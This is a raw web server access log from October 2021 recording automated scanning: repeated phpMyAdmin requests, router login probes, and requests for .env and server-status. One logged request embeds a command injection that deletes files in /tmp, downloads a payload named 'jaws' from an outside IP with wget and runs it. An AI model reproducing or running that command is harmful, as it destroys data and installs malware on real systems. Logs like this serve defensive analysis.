111.70.15.71 - - [04/Oct/2021:20:08:12 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:13 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:13 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:13 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:14 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:14 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:14 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:15 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:15 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:15 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:16 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:16 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:16 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:17 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:17 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:17 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:18 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:18 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:18 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:19 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:19 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:19 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:20 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:20 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:20 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:21 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:21 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:21 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:22 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:22 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:22 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:23 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:23 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:23 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:24 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:24 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:24 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:25 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:25 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:25 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2749 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:26 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:26 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:26 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:27 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:27 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:28 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:28 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:28 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:29 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.70.15.71 - - [04/Oct/2021:20:08:29 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 2713 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
157.230.44.214 - - [04/Oct/2021:20:30:56 +0000] "GET / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36 OPR/53.0.2907.99"
1.10.243.95 - - [04/Oct/2021:20:31:39 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
107.189.6.44 - - [04/Oct/2021:20:35:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://159.89.39.115:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.56.212 - - [04/Oct/2021:21:26:58 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
42.193.23.126 - - [04/Oct/2021:21:27:01 +0000] "\x16\x03\x01" 400 0 "-" "-"
42.193.23.126 - - [04/Oct/2021:21:27:01 +0000] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36"
42.193.23.126 - - [04/Oct/2021:21:47:37 +0000] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36"
165.22.91.126 - - [04/Oct/2021:22:00:52 +0000] "\x16\x03\x01" 400 0 "-" "-"
165.22.91.126 - - [04/Oct/2021:22:00:52 +0000] "GET http://headertest.com/?date_start=1633384852 HTTP/1.1" 200 3488 "-" "checker"
92.118.160.29 - - [04/Oct/2021:22:04:39 +0000] "GET / HTTP/1.0" 200 11595 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
209.141.56.41 - - [04/Oct/2021:22:34:54 +0000] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
80.82.70.228 - - [04/Oct/2021:22:55:09 +0000] "\x16\x03\x02\x01o\x01" 400 0 "-" "-"
5.8.10.202 - - [04/Oct/2021:22:55:49 +0000] "GET / HTTP/1.1" 200 11576 "-" "fasthttp"
5.8.10.202 - - [04/Oct/2021:22:55:49 +0000] "GET /server-status HTTP/1.1" 403 458 "-" "Go-http-client/1.1"
5.8.10.202 - - [04/Oct/2021:22:55:49 +0000] "\x16\x03\x01" 400 0 "-" "-"
5.8.10.202 - - [04/Oct/2021:22:55:49 +0000] "GET /aaa9 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [04/Oct/2021:22:55:49 +0000] "\x16\x03\x01" 400 0 "-" "-"
5.8.10.202 - - [04/Oct/2021:22:55:49 +0000] "GET /aab9 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [04/Oct/2021:22:55:58 +0000] "GET /server-status HTTP/1.1" 403 458 "-" "Go-http-client/1.1"
5.8.10.202 - - [04/Oct/2021:22:55:58 +0000] "\x16\x03\x01" 400 0 "-" "-"
5.8.10.202 - - [04/Oct/2021:22:55:58 +0000] "GET /aaa9 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [04/Oct/2021:22:55:58 +0000] "\x16\x03\x01" 400 0 "-" "-"
5.8.10.202 - - [04/Oct/2021:22:55:59 +0000] "GET /aab9 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
167.99.233.20 - - [04/Oct/2021:23:03:50 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.99.233.20 - - [04/Oct/2021:23:03:50 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.98.49.124 - - [04/Oct/2021:23:10:13 +0000] "GET / HTTP/1.1" 200 3488 "http://159.89.39.115:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
156.197.247.217 - - [04/Oct/2021:23:44:13 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+193.23.161.113/jaws;sh+/tmp/jaws HTTP/1.1" 200 256 "-" "Hello, world"
107.189.6.44 - - [04/Oct/2021:23:45:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://159.89.39.115:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
106.15.94.178 - - [05/Oct/2021:00:03:54 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
